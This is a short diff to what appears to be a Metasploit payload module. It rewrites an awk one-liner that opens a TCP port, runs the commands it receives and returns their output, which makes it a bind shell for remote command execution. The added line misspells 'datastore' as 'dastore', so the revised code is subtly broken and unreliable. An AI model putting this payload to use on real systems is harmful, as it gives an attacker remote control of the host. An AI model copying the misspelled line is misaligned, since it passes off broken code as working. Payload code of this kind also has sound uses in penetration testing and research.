@@ -50,7 +50,7 @@ module Metasploit4
 	# Returns the command string to use for execution
 	#
 	def command_string
-		"awk '{for(s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";s|&getline c;)while(c|&getline)print$0|&s}'<<<X"
+		"awk 'BEGIN{for(s=\"/inet/tcp/#{dastore['LPORT']}/0/0\";s|&getline c;close(c)){while(c|&getline)print$0|&s}}'"
 	end
 
 end
